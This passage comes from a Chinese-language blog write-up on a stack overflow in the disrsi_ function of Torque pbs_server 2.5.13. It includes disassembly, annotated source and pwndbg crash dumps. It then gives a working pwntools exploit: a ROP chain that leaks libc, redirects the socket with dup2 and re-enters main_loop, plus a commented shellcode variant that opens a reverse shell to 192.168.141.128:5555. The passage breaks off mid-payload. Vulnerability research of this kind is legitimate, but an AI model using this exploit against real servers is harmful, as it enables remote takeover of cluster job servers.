+.text:000000000000E134 <span class="nb">cp</span>              <span class="o">=</span> qword ptr <span class="nt">-10h</span>
+.text:000000000000E134 ndigs           <span class="o">=</span> dword ptr <span class="nt">-8</span>
+.text:000000000000E134 locval          <span class="o">=</span> dword ptr <span class="nt">-4</span>
+.text:000000000000E134
+.text:000000000000E134 <span class="p">;</span> __unwind <span class="o">{</span>
+.text:000000000000E134                 endbr64
+.text:000000000000E138                 push    rbp
+.text:000000000000E139                 mov     rbp, rsp
+.text:000000000000E13C                 add     rsp, 0FFFFFFFFFFFFFF80h
+.text:000000000000E140                 mov     <span class="o">[</span>rbp+stream], edi
+.text:000000000000E143                 mov     <span class="o">[</span>rbp+negate], rsi
+.text:000000000000E147                 mov     <span class="o">[</span>rbp+value], rdx
+.text:000000000000E14B                 mov     <span class="o">[</span>rbp+count], ecx
+.text:000000000000E14E                 cmp     <span class="o">[</span>rbp+negate], 0
+.text:000000000000E153                 jnz     short loc_E174
+.text:000000000000E155                 lea     rcx, __PRETTY_FUNCTION___2322 
+.text:000000000000E15C                 mov     edx, 68h
+.text:000000000000E161                 lea     rsi, aLibdisDisrsiC
+.text:000000000000E168                 lea     rdi, aNegateNull
+.text:000000000000E16F                 call    ___assert_fail
+.text:000000000000E174 <span class="p">;</span> <span class="nt">---------------------------------------------------------------------------</span>
+.text:000000000000E174
+.text:000000000000E174 loc_E174:                               <span class="p">;</span> CODE XREF: disrsi_+1F↑j
+.text:000000000000E174                 cmp     <span class="o">[</span>rbp+value], 0
+.text:000000000000E179                 jnz     short loc_E19A
+.text:000000000000E17B                 lea     rcx, __PRETTY_FUNCTION___2322
+.text:000000000000E182                 mov     edx, 69h
+.text:000000000000E187                 lea     rsi, aLibdisDisrsiC
+.text:000000000000E18E                 lea     rdi, aValueNull_1
+.text:000000000000E195                 call    ___assert_fail
+</code></pre></div></div>
+
+<p>每次都是从scratch + 1的位置开始写入，所以实际的溢出长度为0x67（103）</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">disrsi_</span><span class="p">(</span><span class="kt">int</span> <span class="n">stream</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">negate</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="kt">unsigned</span>  <span class="n">count</span><span class="p">){</span>
+  <span class="kt">int</span>  <span class="n">c</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="n">locval</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="n">ndigs</span><span class="p">;</span>
+  <span class="kt">char</span>  <span class="o">*</span><span class="n">cp</span><span class="p">;</span>
+  <span class="kt">char</span>  <span class="n">scratch</span><span class="p">[</span><span class="n">DIS_BUFSIZ</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>     <span class="c1">//被溢出的对象, 长度为65</span>
+
+  <span class="n">memset</span><span class="p">(</span><span class="n">scratch</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">DIS_BUFSIZ</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">dis_umaxd</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">disiui_</span><span class="p">();</span>   <span class="c1">//计算dis_umaxd的值</span>
+    
+	<span class="c1">// 函数指针调用，实际调用tcp_getc函数, 获取1字节tcp数据</span>
+	<span class="c1">// 判断 正负号 以及用户输入是不是一个合法的十进制字符串</span>
+  <span class="k">switch</span> <span class="p">(</span><span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">dis_getc</span><span class="p">)(</span><span class="n">stream</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">case</span> <span class="sc">'-'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'+'</span><span class="p">:</span>
+      <span class="o">*</span><span class="n">negate</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'-'</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">dis_gets</span><span class="p">)(</span><span class="n">stream</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="n">count</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">count</span><span class="p">){</span> <span class="c1">//</span>
+        <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOD</span><span class="p">);</span>
+      <span class="p">}</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">dis_umaxd</span><span class="p">){</span>    <span class="c1">// 经过调试，dis_umaxd=10</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">dis_umaxd</span><span class="p">)</span>    <span class="c1">// 该变量的意义是unsigned int的最大值为0xffff_ffff</span>
+          <span class="k">goto</span> <span class="n">overflow</span><span class="p">;</span>          <span class="c1">// 化为十进制就是4294967295，长度为10个字符</span>
+                                  <span class="c1">// 意义就是unsigned int的最大数需要用10个数字来表示十进制值</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">scratch</span><span class="p">,</span> <span class="n">dis_umax</span><span class="p">,</span> <span class="n">dis_umaxd</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+          <span class="k">goto</span> <span class="n">overflow</span><span class="p">;</span>
+      <span class="p">}</span>                           <span class="c1">// 以上处理用户输入超过unsigned int表示范围的情况</span>
+      <span class="n">cp</span> <span class="o">=</span> <span class="n">scratch</span><span class="p">;</span>
+      <span class="n">locval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+      <span class="k">do</span>
+        <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(((</span><span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">cp</span><span class="o">++</span><span class="p">)</span> <span class="o">&lt;</span> <span class="sc">'0'</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;</span> <span class="sc">'9'</span><span class="p">))</span>
+          <span class="p">{</span>
+          <span class="k">return</span><span class="p">(</span><span class="n">DIS_NONDIGIT</span><span class="p">);</span>
+          <span class="p">}</span>
+
+        <span class="n">locval</span> <span class="o">=</span> <span class="mi">10</span> <span class="o">*</span> <span class="n">locval</span> <span class="o">+</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">count</span><span class="p">);</span>
+      <span class="o">*</span><span class="n">value</span> <span class="o">=</span> <span class="n">locval</span><span class="p">;</span>
+      <span class="k">return</span> <span class="p">(</span><span class="n">DIS_SUCCESS</span><span class="p">);</span>
+
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="sc">'0'</span><span class="p">:</span>     <span class="c1">//第一个数字不能是0</span>
+      <span class="k">return</span> <span class="p">(</span><span class="n">DIS_LEADZRO</span><span class="p">);</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'4'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'6'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'7'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'8'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'9'</span><span class="p">:</span>
+      <span class="n">ndigs</span> <span class="o">=</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>    <span class="c1">//计算十进制字符串的长度</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">){</span>
+      <span class="c1">//每次都是从scratch + 1的位置开始写</span>
+        <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">dis_gets</span><span class="p">)(</span><span class="n">stream</span><span class="p">,</span> <span class="n">scratch</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">){</span>
+          <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOD</span><span class="p">);</span>
+        
+</code></pre></div></div>
+
+<h1 id="漏洞利用">漏洞利用</h1>
+
+<h2 id="发生栈溢出的现场">发生栈溢出的现场</h2>
+
+<p>发现 disrsi_ 函数返回地址已经被覆盖为0xdeadbeefdeadbeef。</p>
+
+<p>rdi寄存器指向我们输入的字符串“111111111”，因此可以考虑往栈上面写”/bin/sh”，这样后面rop的时候rdi指向的就直接是可执行文件的路径。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; c 
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007f3e41963525 <span class="k">in </span>disrsi_ <span class="o">()</span> from /usr/local/lib/libtorque.so.2
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+__________________[ REGISTERS / show-flags off / show-compact-regs off <span class="o">]</span>________________
+<span class="k">*</span>RAX  1
+ RBX  7
+<span class="k">*</span>RCX  0x7f3e416a9015 __ 0x3131313131313131 <span class="o">(</span><span class="s1">'11111111'</span><span class="o">)</span>
+<span class="k">*</span>RDX  0x6f
+<span class="k">*</span>RDI  0x7ffda583cf41 __ 0x3131313131313131 <span class="o">(</span><span class="s1">'11111111'</span><span class="o">)</span>   //注意到rdi指向我们的payload
+<span class="k">*</span>RSI  0x7f3e416a9015 __ 0x3131313131313131 <span class="o">(</span><span class="s1">'11111111'</span><span class="o">)</span>
+<span class="k">*</span>R8   0x7f3e419734d4 <span class="o">(</span>tcp_gets<span class="o">)</span> __ endbr64 
+<span class="k">*</span>R9   0x7f3e41941b80 __ 0
+<span class="k">*</span>R10  0x7f3e41959a9d __ <span class="s1">'read_nonblocking_socket'</span>
+ R11  0x246
+ R12  0x407e20 <span class="o">(</span>_start<span class="o">)</span> __ endbr64 
+ R13  0x7ffda583e8a0 __ 1
+ R14  0
+ R15  0
+<span class="k">*</span>RBP  0x3131313131313131 <span class="o">(</span><span class="s1">'11111111'</span><span class="o">)</span>
+<span class="k">*</span>RSP  0x7ffda583cfa8 __ 0xdeadbeefdeadbeef
+<span class="k">*</span>RIP  0x7f3e41963525 <span class="o">(</span>disrsi_+1009<span class="o">)</span> __ ret 
+___________________________[ DISASM / x86-64 / <span class="nb">set </span>emulate on <span class="o">]</span>__________________________
+ _ 0x7f3e41963525 &lt;disrsi_+1009&gt;    ret                   &lt;0xdeadbeefdeadbeef&gt;
+    _
+
+__________________________________________[ STACK <span class="o">]</span>______________________________________
+00:0000_ rsp 0x7ffda583cfa8 __ 0xdeadbeefdeadbeef
+01:0008_     0x7ffda583cfb0 __ 0
+02:0010_     0x7ffda583cfb8 __ 0x7ffda583d0e4 __ 0xffffffff
+03:0018_     0x7ffda583cfc0 __ 0x7ffda583d0e8 __ 0x7f3e00000000
+04:0020_     0x7ffda583cfc8 __ 0xa00000000
+05:0028_     0x7ffda583cfd0 __ 0x323100
+06:0030_     0x7ffda583cfd8 __ 0
+07:0038_     0x7ffda583cfe0 __ 0
+___________________________________________[ BACKTRACE <span class="o">]</span>_________________________________
+ _ 0   0x7f3e41963525 disrsi_+1009
+   1 0xdeadbeefdeadbeef None
+   2              0x0 None
+_________________________________________
+</code></pre></div></div>
+
+<h2 id="payload构造和函数栈帧">payload构造和函数栈帧</h2>
+
+<h3 id="shellcode执行版本">shellcode执行版本</h3>
+
+<p>其中payload部分长度为229字节，payload头部必须是非零十进制数；</p>
+
+<p>“A” * 103 从 scratch + 1开始覆盖到返回地址；</p>
+
+<p>返回地址覆盖为 jmp rsp 指令的地址；</p>
+
+<p>shellcode的功能是反弹shell到远程主机的5555端口</p>
+
+<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-shellcode_payload.jpg" alt="torque-shellcode payload.jpg" /></p>
+
+<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-shellcode%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7.jpg" alt="torque-shellcode函数栈帧.jpg" /></p>
+
+<h3 id="rop版本">rop版本</h3>
+
+<p>p64(ret)用来把rsp进行16字节对齐</p>
+
+<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-rop%E7%AC%AC%E4%B8%80%E8%BD%AE.jpg" alt="torque-rop第一轮.jpg" /></p>
+
+<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-rop%E7%AC%AC%E4%BA%8C%E8%BD%AE.jpg" alt="torque-rop第二轮.jpg" /></p>
+
+<p>第三轮交互到栈溢出的时候rdi寄存器指向scratch+1的位置，我们可以把“/bin/sh\x00”写在此处这样直接就能作为execv的第一个参数使用。</p>
+
+<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-rop%E7%AC%AC%E4%B8%89%E8%BD%AE.jpg" alt="torque-rop第三轮.jpg" /></p>
+
+<h2 id="利用代码">利用代码</h2>
+
+<h3 id="rop版本可绕nx">rop版本（可绕NX）</h3>
+
+<p>rop版本的利用有3个关键点：</p>
+
+<ol>
+  <li>需要把socket句柄重定向到stdin和stdout，这样才能在execv(”/bin/sh”)之后可以同pwntools和远程交互；</li>
+  <li>需要泄露出libc基地址，由此计算dup2函数地址做输入输出重定向；</li>
+  <li>需要在pbs_server的代码段找到一个可重入的地址，每次栈溢出执行rop之后可以返回到该地址，重新接收下一轮数据，进行下一轮栈溢出</li>
+</ol>
+
+<p>以上这么设计的原因是需要多轮的栈溢出，需要多次和pbs_server交互而不能把它打崩溃。</p>
+
+<p>经过搜索找到main_loop函数作为可重入地址。</p>
+
+<p>该函数是pbs_server的主要逻辑，并且没有参数作为输入，唯一的要求就是，通过rop进入之前要保证rsp是16字节对齐。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">main</span><span class="p">(){</span>
+  <span class="p">......</span>
+  <span class="n">add_conn</span><span class="p">(</span><span class="n">rppfd</span><span class="p">,</span> <span class="n">Primary</span><span class="p">,</span> <span class="p">(</span><span class="n">pbs_net_t</span><span class="p">)</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PBS_SOCK_INET</span><span class="p">,</span> <span class="n">rpp_request</span><span class="p">);</span>
+  <span class="n">add_conn</span><span class="p">(</span><span class="n">privfd</span><span class="p">,</span> <span class="n">Primary</span><span class="p">,</span> <span class="p">(</span><span class="n">pbs_net_t</span><span class="p">)</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PBS_SOCK_INET</span><span class="p">,</span> <span class="n">rpp_request</span><span class="p">);</span>
+
+  <span class="n">main_loop</span><span class="p">();</span>
+  <span class="p">......</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>若进入main_loop之前rsp没有16字节对齐，会报段错误，出错的指令在sprintf函数里面：
+“movaps xmmword ptr [rsp], xmm0”</p>
+
+<ul>
+  <li>这条指令的作用是：将 XMM0 寄存器的 128 位（16字节）数据移动到栈 [rsp] 中；</li>
+  <li>对齐要求：
+    <ul>
+      <li>movaps(<strong>Move Aligned Packed Single-Precision</strong>) 要求目标内存地址 <strong>必须按 16 字节对齐</strong>（即地址是 16 的倍数，如 0x7fffffffe000）</li>
+      <li>若未对齐，会触发段错误异常（崩溃）</li>
+    </ul>
+  </li>
+  <li>替代方法：
+    <ul>
+      <li>确保 rsp 是 16 的倍数</li>
+      <li>改用不要求对齐的 movups（但性能略低）</li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007f29deb78dcd <span class="k">in</span> ?? <span class="o">()</span> from /lib/x86_64-linux-gnu/libc.so.6
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+_____________________[ REGISTERS / show-flags off / show-compact-regs off <span class="o">]</span>_______________________________________________________________
+<span class="k">*</span>RAX  0
+<span class="k">*</span>RBX  0xffffffffffffffff
+<span class="k">*</span>RCX  0
+<span class="k">*</span>RDX  0xffffffffffffffff
+<span class="k">*</span>RDI  0x7ffcd61949c8 __ 0xfbad8000
+<span class="k">*</span>RSI  0x538ba0 <span class="o">(</span>log_buffer<span class="o">)</span> __ <span class="s1">'Torque Server Version = 2.5.13, loglevel = 0'</span>
+<span class="k">*</span>R8   0
+<span class="k">*</span>R9   0x7f29decd1b80 __ 0
+<span class="k">*</span>R10  0x7f29ded15028 __ <span class="s1">'Server Ready, pid = %d, loglevel=%d'</span>
+ R11  0x246
+<span class="k">*</span>R12  0x538ba0 <span class="o">(</span>log_buffer<span class="o">)</span> __ <span class="s1">'Torque Server Version = 2.5.13, loglevel = 0'</span>
+<span class="k">*</span>R13  0x538ba0 <span class="o">(</span>log_buffer<span class="o">)</span> __ <span class="s1">'Torque Server Version = 2.5.13, loglevel = 0'</span>
+<span class="k">*</span>R14  0x7ffcd61949c8 __ 0xfbad8000
+<span class="k">*</span>R15  0x7f29ded15028 __ <span class="s1">'Server Ready, pid = %d, loglevel=%d'</span>
+<span class="k">*</span>RBP  0x7ffcd61949c8 __ 0xfbad8000
+<span class="k">*</span>RSP  0x7ffcd6194988 __ 0
+<span class="k">*</span>RIP  0x7f29deb78dcd __ movaps xmmword ptr <span class="o">[</span>rsp], xmm0
+_____________________[ DISASM / x86-64 / <span class="nb">set </span>emulate on <span class="o">]</span>________________________________________________________________________
+ _ 0x7f29deb78dcd    movaps xmmword ptr <span class="o">[</span>rsp], xmm0     &lt;<span class="o">[</span>0x7ffcd6194988] not aligned to 16 bytes&gt;
+   0x7f29deb78dd1    call   _IO_setb                    &lt;_IO_setb&gt;
+ 
+   0x7f29deb78dd6    movdqa xmm0, xmmword ptr <span class="o">[</span>rsp]
+   0x7f29deb78ddb    mov    qword ptr <span class="o">[</span>rbp + 8], r13
+   0x7f29deb78ddf    movups xmmword ptr <span class="o">[</span>rbp + 0x18], xmm0
+   0x7f29deb78de3    <span class="nb">test   </span>r12, r12
+   0x7f29deb78de6    je     0x7f29deb78e30              &lt;0x7f29deb78e30&gt;
+ 
+   0x7f29deb78de8    movq   xmm0, r12
+   0x7f29deb78ded    movq   xmm1, rbx
+   0x7f29deb78df2    mov    qword ptr <span class="o">[</span>rbp + 0x10], r12
+   0x7f29deb78df6    punpcklqdq xmm0, xmm1
+___________________________________[ STACK <span class="o">]</span>_____________________________________________________________________________________
+00:0000_ rsp 0x7ffcd6194988 __ 0
+01:0008_-038 0x7ffcd6194990 __ 0x7f29deb777bf __ mov dword ptr <span class="o">[</span>rbp + 0xc0], r12d
+02:0010_-030 0x7ffcd6194998 __ 0
+03:0018_-028 0x7ffcd61949a0 __ 0x7ffcd6194b08 __ 0x3000000010
+04:0020_-020 0x7ffcd61949a8 __ 0x538ba0 <span class="o">(</span>log_buffer<span class="o">)</span> __ <span class="s1">'Torque Server Version = 2.5.13, loglevel = 0'</span>
+05:0028_-018 0x7ffcd61949b0 __ 0xffffffffffffffff
+06:0030_-010 0x7ffcd61949b8 __ 0
+07:0038_-008 0x7ffcd61949c0 __ 0x7f29deb6a0e8 __ mov rdx, rbx
+__________________________________[ BACKTRACE <span class="o">]</span>___________________________________________________________________________________
+ _ 0   0x7f29deb78dcd None
+   1   0x7f29deb6a0e8 None
+   2   0x7f29deb46ec8 sprintf+168
+   3         0x421418 main_loop+81
+   4         0x422539 main+2468
+_______________________________________________________________________________________________________
+</code></pre></div></div>
+
+<p>rop解决方式，可以绕过NX：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
+<span class="c1">#context.log_level = 'debug'
+</span><span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>
+
+<span class="n">rp</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">172.17.0.2</span><span class="sh">"</span><span class="p">,</span> <span class="mi">15001</span><span class="p">)</span>
+
+<span class="n">overflow_distance</span> <span class="o">=</span> <span class="mi">103</span>     <span class="c1"># 实际溢出长度为103
+</span><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x41c83d</span>
+<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x4282b0</span>
+<span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0x4426c2</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x421A4F</span>
+<span class="n">jmp_rsp</span> <span class="o">=</span> <span class="mh">0x40900d</span>
+<span class="n">execv_plt</span> <span class="o">=</span> <span class="mh">0x407DA0</span>
+<span class="n">write_plt</span> <span class="o">=</span> <span class="mh">0x407850</span>
+<span class="n">got_snprintf</span> <span class="o">=</span> <span class="mh">0x46A4B0</span>
+<span class="n">main_loop</span> <span class="o">=</span> <span class="mh">0x422534</span>
+
+<span class="c1"># 反弹shell到远程5555端口
+</span><span class="sh">'''</span><span class="s">
+shellcode = asm(shellcraft.connect(</span><span class="sh">"</span><span class="s">192.168.141.128</span><span class="sh">"</span><span class="s">, 5555) + shellcraft.dupsh())
+payload = b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="s"> + b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="s"> * (overflow_distance - 8) + </span><span class="se">\
+</span><span class="s">            p64(jmp_rsp) + shellcode 
+</span><span class="sh">'''</span>
+
+<span class="c1"># rop解决方式
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">overflow_distance</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> \             <span class="c1"># socket句柄的fd=10
+</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">got_snprintf</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> \      <span class="c1"># write(10, got_snprintf, 8) 泄露snprintf函数地址
+</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> \            <span class="c1"># 让rsp 16字节对齐, 否则有些地方会段错误 ?????
+</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">main_loop</span><span class="p">)</span>          <span class="c1"># 返回到main_loop函数继续监听
+</span>
+<span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
+<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+
+<span class="n">snprintf_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">rp</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>  <span class="c1"># 解析snprintf函数地址
+</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">snprintf addr: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">snprintf_addr</span><span class="p">))</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="nc">LibcSearcher</span><span class="p">(</span><span class="sh">'</span><span class="s">snprintf</span><span class="sh">'</span><span class="p">,</span> <span class="n">snprintf_ad</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">snprintf_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="sh">'</span><span class="s">snprintf</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">libc base: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>              <span class="c1"># 计算libc基地址
+</span>
+<span class="n">dup2_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="sh">'</span><span class="s">dup2</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">dup2 addr: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">))</span>              <span class="c1"># 计算dup2函数地址
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">overflow_distance</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="o">+</span> \       <span class="c1"># dup2(10, 0), socket句柄重定向到stdin
+</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> \ 
+            <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="o">+</span> \       <span class="c1"># dup2(10, 1), socket句柄重定向到stdout
+</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">main_loop</span><span class="p">)</span>           <span class="c1"># 返回main_loop函数继续监听
+</span><span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
+<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">overflow_distance</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
